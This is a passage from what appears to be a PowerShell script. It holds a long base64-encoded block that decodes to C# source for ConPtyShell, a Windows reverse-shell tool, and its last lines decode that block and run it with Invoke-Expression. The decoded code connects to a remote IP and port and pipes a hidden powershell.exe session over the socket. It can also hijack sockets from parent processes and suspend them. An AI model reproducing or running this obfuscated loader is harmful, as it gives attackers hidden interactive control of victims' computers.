c3MgY3VycmVudFByb2Nlc3MgPSBudWxsOwogICAgICAgIFByb2Nlc3MgcGFyZW50UHJvY2VzcyA9IG51bGw7CiAgICAgICAgUHJvY2VzcyBncmFuZFBhcmVudFByb2Nlc3MgPSBudWxsOwogICAgICAgIGlmIChHZXRQcm9jQWRkcmVzcyhHZXRNb2R1bGVIYW5kbGUoImtlcm5lbDMyIiksICJDcmVhdGVQc2V1ZG9Db25zb2xlIikgIT0gSW50UHRyLlplcm8pCiAgICAgICAgICAgIGNvbnB0eUNvbXBhdGlibGUgPSB0cnVlOwogICAgICAgIFBST0NFU1NfSU5GT1JNQVRJT04gY2hpbGRQcm9jZXNzSW5mbyA9IG5ldyBQUk9DRVNTX0lORk9STUFUSU9OKCk7CiAgICAgICAgQ3JlYXRlUGlwZXMocmVmIElucHV0UGlwZVJlYWQsIHJlZiBJbnB1dFBpcGVXcml0ZSwgcmVmIE91dHB1dFBpcGVSZWFkLCByZWYgT3V0cHV0UGlwZVdyaXRlKTsKICAgICAgICAvLyBjb21tZW50IHRoZSBiZWxvdyBmdW5jdGlvbiB0byBkZWJ1ZyBlcnJvcnMKICAgICAgICBJbml0Q29uc29sZShyZWYgb2xkU3RkSW4sIHJlZiBvbGRTdGRPdXQsIHJlZiBvbGRTdGRFcnIpOwogICAgICAgIC8vIGluaXQgd3Nhc3RhcnR1cCBzdHVmZiBmb3IgdGhpcyB0aHJlYWQKICAgICAgICBJbml0V1NBVGhyZWFkKCk7CiAgICAgICAgaWYgKGNvbnB0eUNvbXBhdGlibGUpCiAgICAgICAgewogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiXHJcbkNyZWF0ZVBzZXVkb0NvbnNvbGUgZnVuY3Rpb24gZm91bmQhIFNwYXduaW5nIGEgZnVsbHkgaW50ZXJhY3RpdmUgc2hlbGxcclxuIik7CiAgICAgICAgICAgIGlmICh1cGdyYWRlU2hlbGwpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIExpc3Q8SW50UHRyPiBzb2NrZXRzSGFuZGxlcyA9IG5ldyBMaXN0PEludFB0cj4oKTsKICAgICAgICAgICAgICAgIGN1cnJlbnRQcm9jZXNzID0gUHJvY2Vzcy5HZXRDdXJyZW50UHJvY2VzcygpOwogICAgICAgICAgICAgICAgcGFyZW50UHJvY2VzcyA9IFBhcmVudFByb2Nlc3NVdGlsaXRpZXMuR2V0UGFyZW50UHJvY2VzcyhjdXJyZW50UHJvY2Vzcy5IYW5kbGUpOwogICAgICAgICAgICAgICAgaWYgKHBhcmVudFByb2Nlc3MgIT0gbnVsbCkgZ3JhbmRQYXJlbnRQcm9jZXNzID0gUGFyZW50UHJvY2Vzc1V0aWxpdGllcy5HZXRQYXJlbnRQcm9jZXNzKHBhcmVudFByb2Nlc3MuSGFuZGxlKTsKICAgICAgICAgICAgICAgIC8vIHRyeSB0byBkdXBsaWNhdGUgdGhlIHNvY2tldCBmb3IgdGhlIGN1cnJlbnQgcHJvY2VzcwogICAgICAgICAgICAgICAgc2hlbGxTb2NrZXQgPSBTb2NrZXRIaWphY2tpbmcuRHVwbGljYXRlVGFyZ2V0UHJvY2Vzc1NvY2tldChjdXJyZW50UHJvY2VzcywgcmVmIElzU29ja2V0T3ZlcmxhcHBlZCk7CiAgICAgICAgICAgICAgICBpZiAoc2hlbGxTb2NrZXQgPT0gSW50UHRyLlplcm8gJiYgcGFyZW50UHJvY2VzcyAhPSBudWxsKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIC8vIGlmIG5vIHNvY2tldHMgYXJlIGZvdW5kIGluIHRoZSBjdXJyZW50IHByb2Nlc3Mgd2UgdHJ5IHRvIGhpamFjayBvdXIgY3VycmVudCBwYXJlbnQgcHJvY2VzcyBzb2NrZXQKICAgICAgICAgICAgICAgICAgICBzaGVsbFNvY2tldCA9IFNvY2tldEhpamFja2luZy5EdXBsaWNhdGVUYXJnZXRQcm9jZXNzU29ja2V0KHBhcmVudFByb2Nlc3MsIHJlZiBJc1NvY2tldE92ZXJsYXBwZWQpOwogICAgICAgICAgICAgICAgICAgIGlmIChzaGVsbFNvY2tldCA9PSBJbnRQdHIuWmVybyAmJiBncmFuZFBhcmVudFByb2Nlc3MgIT0gbnVsbCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIC8vIGRhbW4sIGV2ZW4gdGhlIHBhcmVudCBwcm9jZXNzIGhhcyBubyB1c2FibGUgc29ja2V0cywgbGV0J3MgdHJ5IGEgbGFzdCBkZXNwZXJhdGUgYXR0ZW1wdCBpbiB0aGUgZ3JhbmRwYXJlbnQgcHJvY2VzcwogICAgICAgICAgICAgICAgICAgICAgICBzaGVsbFNvY2tldCA9IFNvY2tldEhpamFja2luZy5EdXBsaWNhdGVUYXJnZXRQcm9jZXNzU29ja2V0KGdyYW5kUGFyZW50UHJvY2VzcywgcmVmIElzU29ja2V0T3ZlcmxhcHBlZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzaGVsbFNvY2tldCA9PSBJbnRQdHIuWmVybykKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKCJObyBcXERldmljZVxcQWZkIG9iamVjdHMgZm91bmQuIFNvY2tldCBkdXBsaWNhdGlvbiBmYWlsZWQuIik7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBncmFuZFBhcmVudFNvY2tldEluaGVyaXRlZCA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgLy8gZ290Y2hhIGEgdXNhYmxlIHNvY2tldCBmcm9tIHRoZSBwYXJlbnQgcHJvY2VzcywgbGV0J3Mgc2VlIGlmIHRoZSBncmFuZFBhcmVudCBhbHNvIHVzZSB0aGUgc29ja2V0CiAgICAgICAgICAgICAgICAgICAgICAgIHBhcmVudFNvY2tldEluaGVyaXRlZCA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChncmFuZFBhcmVudFByb2Nlc3MgIT0gbnVsbCkgZ3JhbmRQYXJlbnRTb2NrZXRJbmhlcml0ZWQgPSBTb2NrZXRIaWphY2tpbmcuSXNTb2NrZXRJbmhlcml0ZWQoc2hlbGxTb2NrZXQsIGdyYW5kUGFyZW50UHJvY2Vzcyk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIC8vIHRoZSBjdXJyZW50IHByb2Nlc3MgZ290IGEgdXNhYmxlIHNvY2tldCwgbGV0J3Mgc2VlIGlmIHRoZSBwYXJlbnRzIHVzZSB0aGUgc29ja2V0CiAgICAgICAgICAgICAgICAgICAgaWYgKHBhcmVudFByb2Nlc3MgIT0gbnVsbCkgcGFyZW50U29ja2V0SW5oZXJpdGVkID0gU29ja2V0SGlqYWNraW5nLklzU29ja2V0SW5oZXJpdGVkKHNoZWxsU29ja2V0LCBwYXJlbnRQcm9jZXNzKTsKICAgICAgICAgICAgICAgICAgICBpZiAoZ3JhbmRQYXJlbnRQcm9jZXNzICE9IG51bGwpIGdyYW5kUGFyZW50U29ja2V0SW5oZXJpdGVkID0gU29ja2V0SGlqYWNraW5nLklzU29ja2V0SW5oZXJpdGVkKHNoZWxsU29ja2V0LCBncmFuZFBhcmVudFByb2Nlc3MpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgc2hlbGxTb2NrZXQgPSBjb25uZWN0UmVtb3RlKHJlbW90ZUlwLCByZW1vdGVQb3J0KTsKICAgICAgICAgICAgICAgIGlmIChzaGVsbFNvY2tldCA9PSBJbnRQdHIuWmVybykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBvdXRwdXQgKz0gc3RyaW5nLkZvcm1hdCgiezB9Q291bGQgbm90IGNvbm5lY3QgdG8gaXAgezF9IG9uIHBvcnQgezJ9IiwgZXJyb3JTdHJpbmcsIHJlbW90ZUlwLCByZW1vdGVQb3J0LlRvU3RyaW5nKCkpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBvdXRwdXQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBUcnlQYXJzZVJvd3NDb2xzRnJvbVNvY2tldChzaGVsbFNvY2tldCwgcmVmIHJvd3MsIHJlZiBjb2xzKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoR2V0Q29uc29sZVdpbmRvdygpID09IEludFB0ci5aZXJvKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBBbGxvY0NvbnNvbGUoKTsKICAgICAgICAgICAgICAgIFNob3dXaW5kb3coR2V0Q29uc29sZVdpbmRvdygpLCBTV19ISURFKTsKICAgICAgICAgICAgICAgIG5ld0NvbnNvbGVBbGxvY2F0ZWQgPSB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vIGRlYnVnIGNvZGUgZm9yIGNoZWNraW5nIGhhbmRsZSBkdXBsaWNhdGlvbgogICAgICAgICAgICAvLyBDb25zb2xlLldyaXRlTGluZSgiZGVidWc6IENyZWF0aW5nIHBzZXVkbyBjb25zb2xlLi4uIik7CiAgICAgICAgICAgIC8vIFRocmVhZC5TbGVlcCgxODAwMDApOwogICAgICAgICAgICAvLyByZXR1cm4gIiI7CiAgICAgICAgICAgIGludCBwc2V1ZG9Db25zb2xlQ3JlYXRpb25SZXN1bHQgPSBDcmVhdGVQc2V1ZG9Db25zb2xlV2l0aFBpcGVzKHJlZiBoYW5kbGVQc2V1ZG9Db25zb2xlLCByZWYgSW5wdXRQaXBlUmVhZCwgcmVmIE91dHB1dFBpcGVXcml0ZSwgcm93cywgY29scyk7CiAgICAgICAgICAgIGlmIChwc2V1ZG9Db25zb2xlQ3JlYXRpb25SZXN1bHQgIT0gMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgb3V0cHV0ICs9IHN0cmluZy5Gb3JtYXQoInswfUNvdWxkIG5vdCBjcmVhdGUgcHN1ZWRvIGNvbnNvbGUuIEVycm9yIENvZGUgezF9IiwgZXJyb3JTdHJpbmcsIHBzZXVkb0NvbnNvbGVDcmVhdGlvblJlc3VsdC5Ub1N0cmluZygpKTsKICAgICAgICAgICAgICAgIHJldHVybiBvdXRwdXQ7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2hpbGRQcm9jZXNzSW5mbyA9IENyZWF0ZUNoaWxkUHJvY2Vzc1dpdGhQc2V1ZG9Db25zb2xlKGhhbmRsZVBzZXVkb0NvbnNvbGUsIGNvbW1hbmRMaW5lKTsKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgaWYgKHVwZ3JhZGVTaGVsbCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgb3V0cHV0ICs9IHN0cmluZy5Gb3JtYXQoIkNvdWxkIG5vdCB1cGdyYWRlIHNoZWxsIHRvIGZ1bGx5IGludGVyYWN0aXZlIGJlY2F1c2UgQ29uUFRZIGlzIG5vdCBjb21wYXRpYmxlIG9uIHRoaXMgc3lzdGVtIik7CiAgICAgICAgICAgICAgICByZXR1cm4gb3V0cHV0OwogICAgICAgICAgICB9CiAgICAgICAgICAgIHNoZWxsU29ja2V0ID0gY29ubmVjdFJlbW90ZShyZW1vdGVJcCwgcmVtb3RlUG9ydCk7CiAgICAgICAgICAgIGlmIChzaGVsbFNvY2tldCA9PSBJbnRQdHIuWmVybykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgb3V0cHV0ICs9IHN0cmluZy5Gb3JtYXQoInswfUNvdWxkIG5vdCBjb25uZWN0IHRvIGlwIHsxfSBvbiBwb3J0IHsyfSIsIGVycm9yU3RyaW5nLCByZW1vdGVJcCwgcmVtb3RlUG9ydC5Ub1N0cmluZygpKTsKICAgICAgICAgICAgICAgIHJldHVybiBvdXRwdXQ7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlxyXG5DcmVhdGVQc2V1ZG9Db25zb2xlIGZ1bmN0aW9uIG5vdCBmb3VuZCEgU3Bhd25pbmcgYSBuZXRjYXQtbGlrZSBpbnRlcmFjdGl2ZSBzaGVsbC4uLlxyXG4iKTsKICAgICAgICAgICAgU1RBUlRVUElORk8gc0luZm8gPSBuZXcgU1RBUlRVUElORk8oKTsKICAgICAgICAgICAgc0luZm8uY2IgPSBNYXJzaGFsLlNpemVPZihzSW5mbyk7CiAgICAgICAgICAgIHNJbmZvLmR3RmxhZ3MgfD0gKEludDMyKVNUQVJURl9VU0VTVERIQU5ETEVTOwogICAgICAgICAgICBzSW5mby5oU3RkSW5wdXQgPSBJbnB1dFBpcGVSZWFkOwogICAgICAgICAgICBzSW5mby5oU3RkT3V0cHV0ID0gT3V0cHV0UGlwZVdyaXRlOwogICAgICAgICAgICBzSW5mby5oU3RkRXJyb3IgPSBPdXRwdXRQaXBlV3JpdGU7CiAgICAgICAgICAgIENyZWF0ZVByb2Nlc3MobnVsbCwgY29tbWFuZExpbmUsIEludFB0ci5aZXJvLCBJbnRQdHIuWmVybywgdHJ1ZSwgMCwgSW50UHRyLlplcm8sIG51bGwsIHJlZiBzSW5mbywgb3V0IGNoaWxkUHJvY2Vzc0luZm8pOwogICAgICAgIH0KICAgICAgICAvLyBOb3RlOiBXZSBjYW4gY2xvc2UgdGhlIGhhbmRsZXMgdG8gdGhlIFBUWS1lbmQgb2YgdGhlIHBpcGVzIGhlcmUKICAgICAgICAvLyBiZWNhdXNlIHRoZSBoYW5kbGVzIGFyZSBkdXAnZWQgaW50byB0aGUgQ29uSG9zdCBhbmQgd2lsbCBiZSByZWxlYXNlZAogICAgICAgIC8vIHdoZW4gdGhlIENvblBUWSBpcyBkZXN0cm95ZWQuCiAgICAgICAgaWYgKElucHV0UGlwZVJlYWQgIT0gSW50UHRyLlplcm8pIENsb3NlSGFuZGxlKElucHV0UGlwZVJlYWQpOwogICAgICAgIGlmIChPdXRwdXRQaXBlV3JpdGUgIT0gSW50UHRyLlplcm8pIENsb3NlSGFuZGxlKE91dHB1dFBpcGVXcml0ZSk7CiAgICAgICAgaWYgKHVwZ3JhZGVTaGVsbCkgewogICAgICAgICAgICAvLyB3ZSBuZWVkIHRvIHN1c3BlbmQgb3RoZXIgcHJvY2Vzc2VzIHRoYXQgY2FuIGludGVyYWN0IHdpdGggdGhlIGR1cGxpY2F0ZWQgc29ja2V0cyBpZiBhbnkuIFRoaXMgd2lsbCBlbnN1cmUgc3RkaW4sIHN0ZG91dCBhbmQgc3RkZXJyIGlzIHJlYWQvd3JpdGUgb25seSBieSBvdXIgY29ucHR5IHByb2Nlc3MKICAgICAgICAgICAgaWYgKHBhcmVudFNvY2tldEluaGVyaXRlZCkgTnRTdXNwZW5kUHJvY2VzcyhwYXJlbnRQcm9jZXNzLkhhbmRsZSk7CiAgICAgICAgICAgIGlmIChncmFuZFBhcmVudFNvY2tldEluaGVyaXRlZCkgTnRTdXNwZW5kUHJvY2VzcyhncmFuZFBhcmVudFByb2Nlc3MuSGFuZGxlKTsKICAgICAgICAgICAgaWYgKCFJc1NvY2tldE92ZXJsYXBwZWQpIFNvY2tldEhpamFja2luZy5TZXRTb2NrZXRCbG9ja2luZ01vZGUoc2hlbGxTb2NrZXQsIDEpOwogICAgICAgIH0KICAgICAgICAvL1RocmVhZHMgaGF2ZSBiZXR0ZXIgcGVyZm9ybWFuY2UgdGhhbiBUYXNrcwogICAgICAgIFRocmVhZCB0aFRocmVhZFJlYWRQaXBlV3JpdGVTb2NrZXQgPSBTdGFydFRocmVhZFJlYWRQaXBlV3JpdGVTb2NrZXQoT3V0cHV0UGlwZVJlYWQsIHNoZWxsU29ja2V0LCBJc1NvY2tldE92ZXJsYXBwZWQpOwogICAgICAgIFRocmVhZCB0aFJlYWRTb2NrZXRXcml0ZVBpcGUgPSBTdGFydFRocmVhZFJlYWRTb2NrZXRXcml0ZVBpcGUoSW5wdXRQaXBlV3JpdGUsIHNoZWxsU29ja2V0LCBjaGlsZFByb2Nlc3NJbmZvLmhQcm9jZXNzLCBJc1NvY2tldE92ZXJsYXBwZWQpOwogICAgICAgIC8vIHdhaXQgZm9yIHRoZSBjaGlsZCBwcm9jZXNzIHVudGlsIGV4aXQKICAgICAgICBXYWl0Rm9yU2luZ2xlT2JqZWN0KGNoaWxkUHJvY2Vzc0luZm8uaFByb2Nlc3MsIElORklOSVRFKTsKICAgICAgICAvL2NsZWFudXAgZXZlcnl0aGluZwogICAgICAgIHRoVGhyZWFkUmVhZFBpcGVXcml0ZVNvY2tldC5BYm9ydCgpOwogICAgICAgIHRoUmVhZFNvY2tldFdyaXRlUGlwZS5BYm9ydCgpOwogICAgICAgIGlmICh1cGdyYWRlU2hlbGwpCiAgICAgICAgewogICAgICAgICAgICBpZiAoIUlzU29ja2V0T3ZlcmxhcHBlZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgLy8gY2FuY2VsbGluZyB0aGUgZXZlbnQgc2VsZWN0aW9uIGZvciB0aGUgc29ja2V0CiAgICAgICAgICAgICAgICBXU0FFdmVudFNlbGVjdChzaGVsbFNvY2tldCwgSW50UHRyLlplcm8sIDApOwogICAgICAgICAgICAgICAgU29ja2V0SGlqYWNraW5nLlNldFNvY2tldEJsb2NraW5nTW9kZShzaGVsbFNvY2tldCwgMCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKHBhcmVudFNvY2tldEluaGVyaXRlZCkgTnRSZXN1bWVQcm9jZXNzKHBhcmVudFByb2Nlc3MuSGFuZGxlKTsKICAgICAgICAgICAgaWYgKGdyYW5kUGFyZW50U29ja2V0SW5oZXJpdGVkKSBOdFJlc3VtZVByb2Nlc3MoZ3JhbmRQYXJlbnRQcm9jZXNzLkhhbmRsZSk7CiAgICAgICAgfQogICAgICAgIGNsb3Nlc29ja2V0KHNoZWxsU29ja2V0KTsKICAgICAgICBSZXN0b3JlU3RkSGFuZGxlcyhvbGRTdGRJbiwgb2xkU3RkT3V0LCBvbGRTdGRFcnIpOwogICAgICAgIGlmIChuZXdDb25zb2xlQWxsb2NhdGVkKQogICAgICAgICAgICBGcmVlQ29uc29sZSgpOwogICAgICAgIENsb3NlSGFuZGxlKGNoaWxkUHJvY2Vzc0luZm8uaFRocmVhZCk7CiAgICAgICAgQ2xvc2VIYW5kbGUoY2hpbGRQcm9jZXNzSW5mby5oUHJvY2Vzcyk7CiAgICAgICAgaWYgKGhhbmRsZVBzZXVkb0NvbnNvbGUgIT0gSW50UHRyLlplcm8pIENsb3NlUHNldWRvQ29uc29sZShoYW5kbGVQc2V1ZG9Db25zb2xlKTsKICAgICAgICBpZiAoSW5wdXRQaXBlV3JpdGUgIT0gSW50UHRyLlplcm8pIENsb3NlSGFuZGxlKElucHV0UGlwZVdyaXRlKTsKICAgICAgICBpZiAoT3V0cHV0UGlwZVJlYWQgIT0gSW50UHRyLlplcm8pIENsb3NlSGFuZGxlKE91dHB1dFBpcGVSZWFkKTsKICAgICAgICBvdXRwdXQgKz0gIkNvblB0eVNoZWxsIGtpbmRseSBleGl0ZWQuXHJcbiI7CiAgICAgICAgcmV0dXJuIG91dHB1dDsKICAgIH0KfQoKcHVibGljIHN0YXRpYyBjbGFzcyBDb25QdHlTaGVsbE1haW5DbGFzcwp7CiAgICBwcml2YXRlIHN0YXRpYyBzdHJpbmcgaGVscCA9IEAiIjsKCiAgICBwcml2YXRlIHN0YXRpYyBib29sIEhlbHBSZXF1aXJlZChzdHJpbmcgcGFyYW0pCiAgICB7CiAgICAgICAgcmV0dXJuIHBhcmFtID09ICItaCIgfHwgcGFyYW0gPT0gIi0taGVscCIgfHwgcGFyYW0gPT0gIi8/IjsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyB2b2lkIENoZWNrQXJncyhzdHJpbmdbXSBhcmd1bWVudHMpCiAgICB7CiAgICAgICAgaWYgKGFyZ3VtZW50cy5MZW5ndGggPCAyKQogICAgICAgICAgICB0aHJvdyBuZXcgQ29uUHR5U2hlbGxFeGNlcHRpb24oIlxyXG5Db25QdHlTaGVsbDogTm90IGVub3VnaCBhcmd1bWVudHMuIDIgQXJndW1lbnRzIHJlcXVpcmVkLiBVc2UgLS1oZWxwIGZvciBhZGRpdGlvbmFsIGhlbHAuXHJcbiIpOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHZvaWQgRGlzcGxheUhlbHAoKQogICAgewogICAgICAgIENvbnNvbGUuT3V0LldyaXRlKGhlbHApOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHN0cmluZyBDaGVja1JlbW90ZUlwQXJnKHN0cmluZyBpcFN0cmluZykKICAgIHsKICAgICAgICBJUEFkZHJlc3MgYWRkcmVzczsKICAgICAgICBpZiAoIUlQQWRkcmVzcy5UcnlQYXJzZShpcFN0cmluZywgb3V0IGFkZHJlc3MpKQogICAgICAgICAgICB0aHJvdyBuZXcgQ29uUHR5U2hlbGxFeGNlcHRpb24oIlxyXG5Db25QdHlTaGVsbDogSW52YWxpZCByZW1vdGVJcCB2YWx1ZSIgKyBpcFN0cmluZyk7CiAgICAgICAgcmV0dXJuIGlwU3RyaW5nOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIGludCBDaGVja0ludChzdHJpbmcgYXJnKQogICAgewogICAgICAgIGludCByZXQgPSAwOwogICAgICAgIGlmICghSW50MzIuVHJ5UGFyc2UoYXJnLCBvdXQgcmV0KSkKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKCJcclxuQ29uUHR5U2hlbGw6IEludmFsaWQgaW50ZWdlciB2YWx1ZSAiICsgYXJnKTsKICAgICAgICByZXR1cm4gcmV0OwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHVpbnQgUGFyc2VSb3dzKHN0cmluZ1tdIGFyZ3VtZW50cykKICAgIHsKICAgICAgICB1aW50IHJvd3MgPSAyNDsKICAgICAgICBpZiAoYXJndW1lbnRzLkxlbmd0aCA+IDIpCiAgICAgICAgICAgIHJvd3MgPSAodWludClDaGVja0ludChhcmd1bWVudHNbMl0pOwogICAgICAgIHJldHVybiByb3dzOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHVpbnQgUGFyc2VDb2xzKHN0cmluZ1tdIGFyZ3VtZW50cykKICAgIHsKICAgICAgICB1aW50IGNvbHMgPSA4MDsKICAgICAgICBpZiAoYXJndW1lbnRzLkxlbmd0aCA+IDMpCiAgICAgICAgICAgIGNvbHMgPSAodWludClDaGVja0ludChhcmd1bWVudHNbM10pOwogICAgICAgIHJldHVybiBjb2xzOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHN0cmluZyBQYXJzZUNvbW1hbmRMaW5lKHN0cmluZ1tdIGFyZ3VtZW50cykKICAgIHsKICAgICAgICBzdHJpbmcgY29tbWFuZExpbmUgPSAicG93ZXJzaGVsbC5leGUiOwogICAgICAgIGlmIChhcmd1bWVudHMuTGVuZ3RoID4gNCkKICAgICAgICAgICAgY29tbWFuZExpbmUgPSBhcmd1bWVudHNbNF07CiAgICAgICAgcmV0dXJuIGNvbW1hbmRMaW5lOwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIENvblB0eVNoZWxsTWFpbihzdHJpbmdbXSBhcmdzKQogICAgewogICAgICAgIHN0cmluZyBvdXRwdXQgPSAiIjsKICAgICAgICBpZiAoYXJncy5MZW5ndGggPT0gMSAmJiBIZWxwUmVxdWlyZWQoYXJnc1swXSkpCiAgICAgICAgewogICAgICAgICAgICBEaXNwbGF5SGVscCgpOwogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBzdHJpbmcgcmVtb3RlSXAgPSAiIjsKICAgICAgICAgICAgaW50IHJlbW90ZVBvcnQgPSAwOwogICAgICAgICAgICBib29sIHVwZ3JhZGVTaGVsbCA9IGZhbHNlOwogICAgICAgICAgICB0cnkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgQ2hlY2tBcmdzKGFyZ3MpOwogICAgICAgICAgICAgICAgaWYgKGFyZ3NbMF0uQ29udGFpbnMoInVwZ3JhZGUiKSkKICAgICAgICAgICAgICAgICAgICB1cGdyYWRlU2hlbGwgPSB0cnVlOwogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHJlbW90ZUlwID0gQ2hlY2tSZW1vdGVJcEFyZyhhcmdzWzBdKTsKICAgICAgICAgICAgICAgICAgICByZW1vdGVQb3J0ID0gQ2hlY2tJbnQoYXJnc1sxXSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB1aW50IHJvd3MgPSBQYXJzZVJvd3MoYXJncyk7CiAgICAgICAgICAgICAgICB1aW50IGNvbHMgPSBQYXJzZUNvbHMoYXJncyk7CiAgICAgICAgICAgICAgICBzdHJpbmcgY29tbWFuZExpbmUgPSBQYXJzZUNvbW1hbmRMaW5lKGFyZ3MpOwogICAgICAgICAgICAgICAgb3V0cHV0ID0gQ29uUHR5U2hlbGwuU3Bhd25Db25QdHlTaGVsbChyZW1vdGVJcCwgcmVtb3RlUG9ydCwgcm93cywgY29scywgY29tbWFuZExpbmUsIHVwZ3JhZGVTaGVsbCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiXG4iICsgZS5Ub1N0cmluZygpICsgIlxuIik7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIG91dHB1dDsKICAgIH0KfQoKCmNsYXNzIE1haW5DbGFzcwp7CiAgICBzdGF0aWMgdm9pZCBNYWluKHN0cmluZ1tdIGFyZ3MpCiAgICB7CiAgICAgICAgQ29uc29sZS5PdXQuV3JpdGUoQ29uUHR5U2hlbGxNYWluQ2xhc3MuQ29uUHR5U2hlbGxNYWluKGFyZ3MpKTsKICAgIH0KfQoKIkA7"))

    # Execute the decoded string
    Invoke-Expression $DecodedString
}